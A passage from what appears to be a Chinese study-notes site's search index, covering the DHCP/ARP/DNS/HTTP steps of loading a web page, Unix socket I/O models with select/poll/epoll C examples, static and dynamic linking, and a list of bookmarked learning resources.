UDP 文件传送协议 FTP 20/21 TCP 控制连接 21，数据连接 20 远程终端协议 TELNET 23 TCP 超文本传送协议 HTTP 80 TCP 简单邮件传送协议 SMTP 25 TCP 邮件读取协议 POP3 110 TCP 网际报文存取协议 IMAP 143 TCP Web 页面请求过程 # 1. DHCP 配置主机信息 # 假设主机最开始没有 IP 地址以及其它信息，那么就需要先使用 DHCP 来获取。\n主机生成一个 DHCP 请求报文，并将这个报文放入具有目的端口 67 和源端口 68 的 UDP 报文段中。\n该报文段则被放入在一个具有广播 IP 目的地址(255.255.255.255) 和源 IP 地址（0.0.0.0）的 IP 数据报中。\n该数据报则被放置在 MAC 帧中，该帧具有目的地址 FF:\u0026lt;zero-width space\u0026gt;FF:\u0026lt;zero-width space\u0026gt;FF:\u0026lt;zero-width space\u0026gt;FF:\u0026lt;zero-width space\u0026gt;FF:FF，将广播到与交换机连接的所有设备。\n连接在交换机的 DHCP 服务器收到广播帧之后，不断地向上分解得到 IP 数据报、UDP 报文段、DHCP 请求报文，之后生成 DHCP ACK 报文，该报文包含以下信息：IP 地址、DNS 服务器的 IP 地址、默认网关路由器的 IP 地址和子网掩码。该报文被放入 UDP 报文段中，UDP 报文段有被放入 IP 数据报中，最后放入 MAC 帧中。\n该帧的目的地址是请求主机的 MAC 地址，因为交换机具有自学习能力，之前主机发送了广播帧之后就记录了 MAC 地址到其转发接口的交换表项，因此现在交换机就可以直接知道应该向哪个接口发送该帧。\n主机收到该帧后，不断分解得到 DHCP 报文。之后就配置它的 IP 地址、子网掩码和 DNS 服务器的 IP 地址，并在其 IP 转发表中安装默认网关。\n2. ARP 解析 MAC 地址 # 主机通过浏览器生成一个 TCP 套接字，套接字向 HTTP 服务器发送 HTTP 请求。为了生成该套接字，主机需要知道网站的域名对应的 IP 地址。\n主机生成一个 DNS 查询报文，该报文具有 53 号端口，因为 DNS 服务器的端口号是 53。\n该 DNS 查询报文被放入目的地址为 DNS 服务器 IP 地址的 IP 数据报中。\n该 IP 数据报被放入一个以太网帧中，该帧将发送到网关路由器。\nDHCP 过程只知道网关路由器的 IP 地址，为了获取网关路由器的 MAC 地址，需要使用 ARP 协议。\n主机生成一个包含目的地址为网关路由器 IP 地址的 ARP 查询报文，将该 ARP 查询报文放入一个具有广播目的地址（FF:\u0026lt;zero-width space\u0026gt;FF:\u0026lt;zero-width space\u0026gt;FF:\u0026lt;zero-width space\u0026gt;FF:\u0026lt;zero-width space\u0026gt;FF:FF）的以太网帧中，并向交换机发送该以太网帧，交换机将该帧转发给所有的连接设备，包括网关路由器。\n网关路由器接收到该帧后，不断向上分解得到 ARP 报文，发现其中的 IP 地址与其接口的 IP 地址匹配，因此就发送一个 ARP 回答报文，包含了它的 MAC 地址，发回给主机。\n3. DNS 解析域名 # 知道了网关路由器的 MAC 地址之后，就可以继续 DNS 的解析过程了。\n网关路由器接收到包含 DNS 查询报文的以太网帧后，抽取出 IP 数据报，并根据转发表决定该 IP 数据报应该转发的路由器。\n因为路由器具有内部网关协议（RIP、OSPF）和外部网关协议（BGP）这两种路由选择协议，因此路由表中已经配置了网关路由器到达 DNS 服务器的路由表项。\n到达 DNS 服务器之后，DNS 服务器抽取出 DNS 查询报文，并在 DNS 数据库中查找待解析的域名。\n找到 DNS 记录之后，发送 DNS 回答报文，将该回答报文放入 UDP 报文段中，然后放入 IP 数据报中，通过路由器反向转发回网关路由器，并经过以太网交换机到达主机。\n4. HTTP 请求页面 # 有了 HTTP 服务器的 IP 地址之后，主机就能够生成 TCP 套接字，该套接字将用于向 Web 服务器发送 HTTP GET 报文。\n在生成 TCP 套接字之前，必须先与 HTTP 服务器进行三次握手来建立连接。生成一个具有目的端口 80 的 TCP SYN 报文段，并向 HTTP 服务器发送该报文段。\nHTTP 服务器收到该报文段之后，生成 TCP SYN ACK 报文段，发回给主机。\n连接建立之后，浏览器生成 HTTP GET 报文，并交付给 HTTP 服务器。\nHTTP 服务器从 TCP 套接字读取 HTTP GET 报文，生成一个 HTTP 响应报文，将 Web 页面内容放入报文主体中，发回给主机。\n浏览器收到 HTTP 响应报文后，抽取出 Web 页面内容，之后进行渲染，显示 Web 页面。\n参考链接 # 计算机网络, 谢希仁 JamesF.Kurose, KeithW.Ross, 库罗斯, 等. 计算机网络: 自顶向下方法 [M]. 机械工业出版社, 2014. W.RichardStevens. TCP/IP 详解. 卷 1, 协议 [M]. 机械工业出版社, 2006. Active vs Passive FTP Mode: Which One is More Secure? Active and Passive FTP Transfers Defined - KB Article #1138 Traceroute ping How DHCP works and DHCP Interview Questions and Answers What is process of DORA in DHCP? What is DHCP Server ? Tackling emissions targets in Tokyo What does my ISP know when I use Tor? Technology-Computer Networking[1]-Computer Networks and the Internet P2P 网络概述. Circuit Switching (a) Circuit switching. (b) Packet switching. "},{"id":34,"href":"/keeplearning/docs/network/socket/","title":"Socket","section":"网络","content":" Socket # I/O 模型 # 一个输入操作通常包括两个阶段：\n等待数据准备好 从内核向进程复制数据 对于一个套接字上的输入操作，第一步通常涉及等待数据从网络中到达。当所等待数据到达时，它被复制到内核中的某个缓冲区。第二步就是把数据从内核缓冲区复制到应用进程缓冲区。\nUnix 有五种 I/O 模型：\n阻塞式 I/O 非阻塞式 I/O I/O 复用（select 和 poll） 信号驱动式 I/O（SIGIO） 异步 I/O（AIO） 阻塞式 I/O # 应用进程被阻塞，直到数据从内核缓冲区复制到应用进程缓冲区中才返回。\n应该注意到，在阻塞的过程中，其它应用进程还可以执行，因此阻塞不意味着整个操作系统都被阻塞。因为其它应用进程还可以执行，所以不消耗 CPU 时间，这种模型的 CPU 利用率会比较高。\n下图中，recvfrom() 用于接收 Socket 传来的数据，并复制到应用进程的缓冲区 buf 中。这里把 recvfrom() 当成系统调用。\nssize_t recvfrom(int sockfd, void *buf, size_t len, int flags, struct sockaddr *src_addr, socklen_t *addrlen); 非阻塞式 I/O # 应用进程执行系统调用之后，内核返回一个错误码。应用进程可以继续执行，但是需要不断的执行系统调用来获知 I/O 是否完成，这种方式称为轮询（polling）。\n由于 CPU 要处理更多的系统调用，因此这种模型的 CPU 利用率比较低。\nI/O 复用 # 使用 select 或者 poll 等待数据，并且可以等待多个套接字中的任何一个变为可读。这一过程会被阻塞，当某一个套接字可读时返回，之后再使用 recvfrom 把数据从内核复制到进程中。\n它可以让单个进程具有处理多个 I/O 事件的能力。又被称为 Event Driven I/O，即事件驱动 I/O。\n如果一个 Web 服务器没有 I/O 复用，那么每一个 Socket 连接都需要创建一个线程去处理。如果同时有几万个连接，那么就需要创建相同数量的线程。相比于多进程和多线程技术，I/O 复用不需要进程线程创建和切换的开销，系统开销更小。\n信号驱动 I/O # 应用进程使用 sigaction 系统调用，内核立即返回，应用进程可以继续执行，也就是说等待数据阶段应用进程是非阻塞的。内核在数据到达时向应用进程发送 SIGIO 信号，应用进程收到之后在信号处理程序中调用 recvfrom 将数据从内核复制到应用进程中。\n相比于非阻塞式 I/O 的轮询方式，信号驱动 I/O 的 CPU 利用率更高。\n异步 I/O # 应用进程执行 aio_read 系统调用会立即返回，应用进程可以继续执行，不会被阻塞，内核会在所有操作完成之后向应用进程发送信号。\n异步 I/O 与信号驱动 I/O 的区别在于，异步 I/O 的信号是通知应用进程 I/O 完成，而信号驱动 I/O 的信号是通知应用进程可以开始 I/O。\n五大 I/O 模型比较 # 同步 I/O：将数据从内核缓冲区复制到应用进程缓冲区的阶段（第二阶段），应用进程会阻塞。 异步 I/O：第二阶段应用进程不会阻塞。 同步 I/O 包括阻塞式 I/O、非阻塞式 I/O、I/O 复用和信号驱动 I/O ，它们的主要区别在第一个阶段。\n非阻塞式 I/O 、信号驱动 I/O 和异步 I/O 在第一阶段不会阻塞。\nI/O 复用 # select/poll/epoll 都是 I/O 多路复用的具体实现，select 出现的最早，之后是 poll，再是 epoll。\nselect # int select(int n, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout); select 允许应用程序监视一组文件描述符，等待一个或者多个描述符成为就绪状态，从而完成 I/O 操作。\nfd_set 使用数组实现，数组大小使用 FD_SETSIZE 定义，所以只能监听少于 FD_SETSIZE 数量的描述符。有三种类型的描述符类型：readset、writeset、exceptset，分别对应读、写、异常条件的描述符集合。\ntimeout 为超时参数，调用 select 会一直阻塞直到有描述符的事件到达或者等待的时间超过 timeout。\n成功调用返回结果大于 0，出错返回结果为 -1，超时返回结果为 0。\nfd_set fd_in, fd_out; struct timeval tv; // Reset the sets FD_ZERO( \u0026amp;fd_in ); FD_ZERO( \u0026amp;fd_out ); // Monitor sock1 for input events FD_SET( sock1, \u0026amp;fd_in ); // Monitor sock2 for output events FD_SET( sock2, \u0026amp;fd_out ); // Find out which socket has the largest numeric value as select requires it int largest_sock = sock1 \u0026gt; sock2 ? sock1 : sock2; // Wait up to 10 seconds tv.tv_sec = 10; tv.tv_usec = 0; // Call the select int ret = select( largest_sock + 1, \u0026amp;fd_in, \u0026amp;fd_out, NULL, \u0026amp;tv ); // Check if select actually succeed if ( ret == -1 ) // report error and abort else if ( ret == 0 ) // timeout; no event detected else { if ( FD_ISSET( sock1, \u0026amp;fd_in ) ) // input event on sock1 if ( FD_ISSET( sock2, \u0026amp;fd_out ) ) // output event on sock2 } poll # int poll(struct pollfd *fds, unsigned int nfds, int timeout); poll 的功能与 select 类似，也是等待一组描述符中的一个成为就绪状态。\npoll 中的描述符是 pollfd 类型的数组，pollfd 的定义如下：\nstruct pollfd { int fd; /* file descriptor */ short events; /* requested events */ short revents; /* returned events */ }; // The structure for two events struct pollfd fds[2]; // Monitor sock1 for input fds[0].fd = sock1; fds[0].events = POLLIN; // Monitor sock2 for output fds[1].fd = sock2; fds[1].events = POLLOUT; // Wait 10 seconds int ret = poll( \u0026amp;fds, 2, 10000 ); // Check if poll actually succeed if ( ret == -1 ) // report error and abort else if ( ret == 0 ) // timeout; no event detected else { // If we detect the event, zero it out so we can reuse the structure if ( fds[0].revents \u0026amp; POLLIN ) fds[0].revents = 0; // input event on sock1 if ( fds[1].revents \u0026amp; POLLOUT ) fds[1].revents = 0; // output event on sock2 } 比较 # 1. 功能 # select 和 poll 的功能基本相同，不过在一些实现细节上有所不同。\nselect 会修改描述符，而 poll 不会； select 的描述符类型使用数组实现，FD_SETSIZE 大小默认为 1024，因此默认只能监听少于 1024 个描述符。如果要监听更多描述符的话，需要修改 FD_SETSIZE 之后重新编译；而 poll 没有描述符数量的限制； poll 提供了更多的事件类型，并且对描述符的重复利用上比 select 高。 如果一个线程对某个描述符调用了 select 或者 poll，另一个线程关闭了该描述符，会导致调用结果不确定。 2. 速度 # select 和 poll 速度都比较慢，每次调用都需要将全部描述符从应用进程缓冲区复制到内核缓冲区。\n3. 可移植性 # 几乎所有的系统都支持 select，但是只有比较新的系统支持 poll。\nepoll # int epoll_create(int size); int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event)； int epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout); epoll_ctl() 用于向内核注册新的描述符或者是改变某个文件描述符的状态。已注册的描述符在内核中会被维护在一棵红黑树上，通过回调函数内核会将 I/O 准备好的描述符加入到一个链表中管理，进程调用 epoll_wait() 便可以得到事件完成的描述符。\n从上面的描述可以看出，epoll 只需要将描述符从进程缓冲区向内核缓冲区拷贝一次，并且进程不需要通过轮询来获得事件完成的描述符。\nepoll 仅适用于 Linux OS。\nepoll 比 select 和 poll 更加灵活而且没有描述符数量限制。\nepoll 对多线程编程更有友好，一个线程调用了 epoll_wait() 另一个线程关闭了同一个描述符也不会产生像 select 和 poll 的不确定情况。\n// Create the epoll descriptor. Only one is needed per app, and is used to monitor all sockets. // The function argument is ignored (it was not before, but now it is), so put your favorite number here int pollingfd = epoll_create( 0xCAFE ); if ( pollingfd \u0026lt; 0 ) // report error // Initialize the epoll structure in case more members are added in future struct epoll_event ev = { 0 }; // Associate the connection class instance with the event. You can associate anything // you want, epoll does not use this information. We store a connection class pointer, pConnection1 ev.data.ptr = pConnection1; // Monitor for input, and do not automatically rearm the descriptor after the event ev.events = EPOLLIN | EPOLLONESHOT; // Add the descriptor into the monitoring list. We can do it even if another thread is // waiting in epoll_wait - the descriptor will be properly added if ( epoll_ctl( epollfd, EPOLL_CTL_ADD, pConnection1-\u0026gt;getSocket(), \u0026amp;ev ) != 0 ) // report error // Wait for up to 20 events (assuming we have added maybe 200 sockets before that it may happen) struct epoll_event pevents[ 20 ]; // Wait for 10 seconds, and retrieve less than 20 epoll_event and store them into epoll_event array int ready = epoll_wait( pollingfd, pevents, 20, 10000 ); // Check if epoll actually succeed if ( ret == -1 ) // report error and abort else if ( ret == 0 ) // timeout; no event detected else { // Check if any events detected for ( int i = 0; i \u0026lt; ready; i++ ) { if ( pevents[i].events \u0026amp; EPOLLIN ) { // Get back our connection pointer Connection * c = (Connection*) pevents[i].data.ptr; c-\u0026gt;handleReadEvent(); } } } 工作模式 # epoll 的描述符事件有两种触发模式：LT（level trigger）和 ET（edge trigger）。\n1. LT 模式 # 当 epoll_wait() 检测到描述符事件到达时，将此事件通知进程，进程可以不立即处理该事件，下次调用 epoll_wait() 会再次通知进程。是默认的一种模式，并且同时支持 Blocking 和 No-Blocking。\n2. ET 模式 # 和 LT 模式不同的是，通知之后进程必须立即处理事件，下次再调用 epoll_wait() 时不会再得到事件到达的通知。\n很大程度上减少了 epoll 事件被重复触发的次数，因此效率要比 LT 模式高。只支持 No-Blocking，以避免由于一个文件句柄的阻塞读/阻塞写操作把处理多个文件描述符的任务饿死。\n应用场景 # 很容易产生一种错觉认为只要用 epoll 就可以了，select 和 poll 都已经过时了，其实它们都有各自的使用场景。\n1. select 应用场景 # select 的 timeout 参数精度为微秒，而 poll 和 epoll 为毫秒，因此 select 更加适用于实时性要求比较高的场景，比如核反应堆的控制。\nselect 可移植性更好，几乎被所有主流平台所支持。\n2. poll 应用场景 # poll 没有最大描述符数量的限制，如果平台支持并且对实时性要求不高，应该使用 poll 而不是 select。\n3. epoll 应用场景 # 只需要运行在 Linux 平台上，有大量的描述符需要同时轮询，并且这些连接最好是长连接。\n需要同时监控小于 1000 个描述符，就没有必要使用 epoll，因为这个应用场景下并不能体现 epoll 的优势。\n需要监控的描述符状态变化多，而且都是非常短暂的，也没有必要使用 epoll。因为 epoll 中的所有描述符都存储在内核中，造成每次需要对描述符的状态改变都需要通过 epoll_ctl() 进行系统调用，频繁系统调用降低效率。并且 epoll 的描述符存储在内核，不容易调试。\n参考资料 # Stevens W R, Fenner B, Rudoff A M. UNIX network programming[M]. Addison-Wesley Professional, 2004. http://man7.org/linux/man-pages/man2/select.2.html http://man7.org/linux/man-pages/man2/poll.2.html Boost application performance using asynchronous I/O Synchronous and Asynchronous I/O Linux IO 模式及 select、poll、epoll 详解 poll vs select vs event-based select / poll / epoll: practical difference for system architects Browse the source code of userspace/glibc/sysdeps/unix/sysv/linux/ online "},{"id":35,"href":"/keeplearning/docs/os/link/","title":"链接","section":"操作系统","content":" 链接 # 编译系统 # 以下是一个 hello.c 程序：\n#include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026#34;hello, world\\n\u0026#34;); return 0; } 在 Unix 系统上，由编译器把源文件转换为目标文件。\ngcc -o hello hello.c 这个过程大致如下：\n预处理阶段：处理以 # 开头的预处理命令； 编译阶段：翻译成汇编文件； 汇编阶段：将汇编文件翻译成可重定位目标文件； 链接阶段：将可重定位目标文件和 printf.o 等单独预编译好的目标文件进行合并，得到最终的可执行目标文件。 静态链接 # 静态链接器以一组可重定位目标文件为输入，生成一个完全链接的可执行目标文件作为输出。链接器主要完成以下两个任务：\n符号解析：每个符号对应于一个函数、一个全局变量或一个静态变量，符号解析的目的是将每个符号引用与一个符号定义关联起来。 重定位：链接器通过把每个符号定义与一个内存位置关联起来，然后修改所有对这些符号的引用，使得它们指向这个内存位置。 目标文件 # 可执行目标文件：可以直接在内存中执行； 可重定位目标文件：可与其它可重定位目标文件在链接阶段合并，创建一个可执行目标文件； 共享目标文件：这是一种特殊的可重定位目标文件，可以在运行时被动态加载进内存并链接； 动态链接 # 静态库有以下两个问题：\n当静态库更新时那么整个程序都要重新进行链接； 对于 printf 这种标准函数库，如果每个程序都要有代码，这会极大浪费资源。 共享库是为了解决静态库的这两个问题而设计的，在 Linux 系统中通常用 .so 后缀来表示，Windows 系统上它们被称为 DLL。它具有以下特点：\n在给定的文件系统中一个库只有一个文件，所有引用该库的可执行目标文件都共享这个文件，它不会被复制到引用它的可执行文件中； 在内存中，一个共享库的 .text 节（已编译程序的机器代码）的一个副本可以被不同的正在运行的进程共享。 "},{"id":36,"href":"/keeplearning/docs/favorite/","title":"收藏夹","section":"Docs","content":" 收藏夹 # 面试题 # 对线面试官面试系列 命中率极高的 Go 面试题，赶紧收藏！ Redis面试题（总结最全面的面试题） 很用心的为你写了 9 道 MySQL 面试题 史上最详细的一线大厂Mysql面试题详解 面试BAT前先搞定这18道MySQL经典面试题（含答案解析） MySQL面试题（总结最全面的面试题） mysql索引相关面试题 Golang 常见面试题目解析 化身一个请求感受浏览器输入URL后奇妙的网络之旅 TCP和UDP协议的区别以及原理 视频 # 黑马程序员 MySQL数据库入门到精通，从mysql安装到mysql高级、mysql优化全囊括 李敖對佛教徒迎佛骨之批判《李敖大哥大》 21.07.05~22.02.27各大厂面试出现过的算法题都在这了，总共62题，认真看完一半算法关不再是绊脚石 在线文档 # 计算机教育中缺失的一课 interview-go Docker-从入门到实战 区块链技术指南 build-web-application-with-golang Mastering_Go Go语言101 《GO专家编程》 PHP扩展开发及内核应用 JavaScript 标准参考教程 ES6 入门教程 JavaScript 教程 网道 PHP编程之道 Kubernetes 文档 Uber Go 语言编码规范 地鼠文档 go Standard library 床长人工智能教程 Golang开发手记 Git飞行规则(Flight Rules) Pro Git（中文版） 南京大学 计算机科学与技术系 计算机系统基础 课程实验 2019 Mysql 实战45讲 一份不太简短的 LATEX介绍 A Programmer\u0026rsquo;s Guide to English 博主 # 刘丹冰aceld 代码随想录 gairuo 面向信仰编程 小林coding 煎鱼 xargin 竹子爱熊猫 技术印记 abcdocker运维博客 Java充电社 go.nsddd.top mojotv NoahNyy 大都督的技术博客 欧长坤 LABULADONG 的算法网站 CS-Notes Hello 算法 小惡魔 - AppleBOY 工具 # HTTP Cats loading.io Data Structure Visualizations learn git branching navicat premium15破解教程 Bit Calculator YouTube Video Download 冷熊简历 身份证号码生成器 PlantUML简述 在线PS-Photopea / 在线PS-toolwa json2yaml crontab.guru 资料库 # 国内多家权威出版社：10000多本电子书合集 ahhhhfs｜A姐分享 首发整理！【编程开发全套资料】 百度网盘资源 IT_book 站长免费证书 可能是最用心的「Go学习建议」 编程书籍的整理和收集 Go 书籍 Concurrency in Go 大鹏教育所有课程/提取码：q21b "},{"id":37,"href":"/keeplearning/docs/hidden/","title":"😪xxxxxx","section":"Docs","content":" Go "}]